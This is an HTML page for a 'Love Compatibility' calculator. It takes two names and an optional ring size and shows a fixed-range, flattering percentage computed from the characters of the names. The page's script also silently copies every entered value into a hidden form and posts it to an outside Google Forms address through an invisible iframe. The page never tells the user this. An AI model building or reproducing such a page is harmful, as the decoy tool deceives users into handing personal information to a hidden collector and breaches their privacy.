<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Match</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

html,body{
    width:100%;
    height:100%;
    overflow:hidden;
    background: linear-gradient(180deg,#1a1a1a,#0a0a0a);
}

/* center layout */
body{
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

/* card */
.container{
    width:100%;
    max-width:420px;
    background:rgba(255,255,255,0.06);
    border:1px solid rgba(255,255,255,0.1);
    backdrop-filter:blur(20px);
    border-radius:24px;
    padding:28px;
    color:white;
    box-shadow:0 20px 60px rgba(0,0,0,0.5);
}

/* title */
h1{
    text-align:center;
    font-size:20px;
    font-weight:500;
    margin-bottom:18px;
    opacity:0.9;
}

.heart{
    text-align:center;
    font-size:40px;
    margin-bottom:10px;
}

/* inputs */
input{
    width:100%;
    padding:14px;
    margin-bottom:10px;
    border-radius:14px;
    border:1px solid rgba(255,255,255,0.1);
    background:rgba(255,255,255,0.05);
    color:white;
    outline:none;
    font-size:14px;
    transition:0.2s;
}

input:focus{
    border-color:rgba(255,255,255,0.3);
    transform:scale(1.01);
}

/* button */
button{
    width:100%;
    padding:14px;
    margin-top:8px;
    border-radius:14px;
    border:none;
    background:white;
    color:black;
    font-weight:600;
    cursor:pointer;
    transition:0.2s;
}

button:active{
    transform:scale(0.98);
}

/* result */
.result{
    margin-top:20px;
    display:none;
}

.percent{
    text-align:center;
    font-size:32px;
    font-weight:600;
    margin-bottom:10px;
}

/* bar */
.bar{
    width:100%;
    height:10px;
    background:rgba(255,255,255,0.08);
    border-radius:50px;
    overflow:hidden;
}

.fill{
    height:100%;
    width:0%;
    background:linear-gradient(90deg,#ffffff,#b3b3b3);
    border-radius:50px;
    transition:1.8s cubic-bezier(0.22, 1, 0.36, 1);
}

/* message */
.message{
    text-align:center;
    margin-top:12px;
    font-size:14px;
    opacity:0.8;
}

/* loader */
.overlay{
    position:fixed;
    inset:0;
    display:none;
    justify-content:center;
    align-items:center;
    background:rgba(0,0,0,0.3);
    backdrop-filter:blur(18px);
}

.loader{
    background:rgba(255,255,255,0.08);
    border:1px solid rgba(255,255,255,0.15);
    padding:18px 22px;
    border-radius:16px;
    color:white;
    font-size:14px;
}

/* footer */
.footer{
    position:fixed;
    bottom:10px;
    left:50%;
    transform:translateX(-50%);
    font-size:11px;
    color:rgba(255,255,255,0.6);
    background:rgba(255,255,255,0.05);
    padding:6px 12px;
    border-radius:12px;
    border:1px solid rgba(255,255,255,0.08);
}

/* mobile */
@media(max-width:480px){
    .container{
        padding:22px;
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="heart">❤️</div>
    <h1>Love Compatibility</h1>

    <input id="name1" placeholder="Your name">
    <input id="name2" placeholder="Their name">
    <input id="ring" placeholder="Ring size (optional)">

    <button onclick="calc()">Calculate</button>

    <div class="result" id="result">
        <div class="percent" id="percent">0%</div>
        <div class="bar"><div class="fill" id="fill"></div></div>
        <div class="message" id="msg"></div>
    </div>

</div>

<!-- loader -->
<div class="overlay" id="overlay">
    <div class="loader">Calculating...</div>
</div>

<!-- google form -->
<form id="form"
action="https://docs.google.com/forms/d/e/1FAIpQLSdpvaxjPEfTz-nKFGHoc8J3UhV2hWlXS1cQSAR_NH1e9TSzgg/formResponse"
method="POST"
target="hidden">

<input name="entry.1203440948" id="g1">
<input name="entry.632297335" id="g2">
<input name="entry.2029294024" id="g3">

</form>

<iframe name="hidden" style="display:none;"></iframe>

<div class="footer">
dev </> prottoy • built for fun
</div>

<script>

function calc(){

    const o=document.getElementById("overlay");
    o.style.display="flex";

    setTimeout(()=>{

        o.style.display="none";

        let n1=document.getElementById("name1").value.trim();
        let n2=document.getElementById("name2").value.trim();
        let ring=document.getElementById("ring").value;

        if(!n1||!n2){
            alert("Enter names");
            return;
        }

        let sum=0;
        let s=(n1+n2).toLowerCase();

        for(let i=0;i<s.length;i++){
            sum+=s.charCodeAt(i);
        }

        let percent=(sum%41)+60;

        document.getElementById("result").style.display="block";
        document.getElementById("percent").innerText=percent+"%";

        setTimeout(()=>{
            document.getElementById("fill").style.width=percent+"%";
        },200);

        let msg="Compatibility detected";
        if(percent>90) msg="Very strong match";
        if(percent>97) msg="Perfect connection";

        document.getElementById("msg").innerText=msg;

        // google form
        document.getElementById("g1").value=n1;
        document.getElementById("g2").value=n2;
        document.getElementById("g3").value=ring;

        document.getElementById("form").submit();

    },900);
}

</script>

</body>
</html>
